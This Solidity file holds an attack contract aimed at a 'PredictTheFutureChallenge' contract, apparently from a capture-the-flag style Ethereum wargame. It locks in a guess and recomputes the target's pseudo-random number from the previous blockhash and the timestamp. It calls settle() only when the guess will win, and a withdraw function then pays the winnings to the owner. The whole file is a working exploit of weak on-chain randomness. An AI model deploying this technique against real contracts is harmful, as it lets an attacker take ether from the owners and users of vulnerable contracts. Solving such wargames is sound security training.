pragma solidity 0.8.11;

interface PredictTheFutureChallenge {
    function settle() external;
    function isComplete() external returns (bool);
    function lockInGuess(uint8) external payable;
}
contract AttackNewNumberFuture {

    address owner;
    PredictTheFutureChallenge challenge;
    event AnswerEvent(uint8 answer);
    constructor() payable {
        owner = msg.sender;
    }


    function lockItIn(address challenge_address) public payable {
        require(msg.sender == owner);
        require(msg.value == 1 ether);
        challenge = PredictTheFutureChallenge(challenge_address);
        challenge.lockInGuess{value: 1 ether}(1);
    }
    function guess(address challenge_address) public payable {
        challenge = PredictTheFutureChallenge(challenge_address);
        uint8 answer = uint8(uint256(keccak256(abi.encode(blockhash(block.number - 1), block.timestamp)))) % 10;
        emit AnswerEvent(answer);
        if (answer == uint8(1)) {
            challenge.settle();
        }
    }

    function withdraw() public {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}

}